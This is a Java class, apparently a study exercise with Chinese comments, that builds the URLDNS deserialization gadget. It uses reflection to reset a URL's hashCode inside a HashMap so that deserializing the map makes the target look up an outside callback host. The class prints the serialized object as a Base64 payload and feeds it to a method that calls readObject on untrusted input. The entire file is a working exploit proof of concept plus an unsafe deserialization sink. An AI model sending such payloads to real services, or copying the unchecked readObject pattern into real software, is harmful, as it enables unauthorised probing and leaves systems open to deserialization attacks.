import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.Base64;
import java.util.HashMap;

public class TestClass {
    public static void serialization(Object object)  throws Exception{
        FileOutputStream fileOutputStream = new FileOutputStream("URLDNS.txt");
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(object);
        System.out.println("serialization方法成功执行");
    }
    public static String serialize(String data) {
        try {
            byte[] payload = Base64.getDecoder().decode(data);
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(payload);
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            return "success";
        } catch (Exception var5) {
            return var5.getMessage();
        }
    }

    public static String serializeAndPrintBase64(Object object) throws Exception {
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(object);
        objectOutputStream.close();

        byte[] serializedBytes = byteArrayOutputStream.toByteArray();

        // 使用Base64编码字节数组并打印到控制台
        String base64Encoded = Base64.getEncoder().encodeToString(serializedBytes);
//        String payload = Arrays.toString(Base64.getDecoder().decode(base64Encoded));
//        System.out.println(payload);
        System.out.println("Serialized and Base64 encoded object: " + base64Encoded);
        return base64Encoded;

    }


    public static void unserialization() throws Exception{
        FileInputStream fileInputStream = new FileInputStream("URLDNS.txt");
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();
        System.out.println("unserialization执行成功");
    }

    public static void main(String[] args) throws Exception{
        HashMap hashMap = new HashMap();
        URL url = new URL("http://lyvjkhojjz.dgrh3.cn");

        /********反射*******/
        //将hashCode的值不改为*1
        Class c = url.getClass();
//        System.out.println(c);
        Field hashcodefield = c.getDeclaredField("hashCode");
        hashcodefield.setAccessible(true);
        hashcodefield.set(url,1234);//设置hashCode值为1234

        hashMap.put(url,1);
        hashcodefield.set(url,-1);//设置hashCode值为-1
//        serialization(hashMap);
        serialize(serializeAndPrintBase64(hashMap));
//        unserialization();
    }
}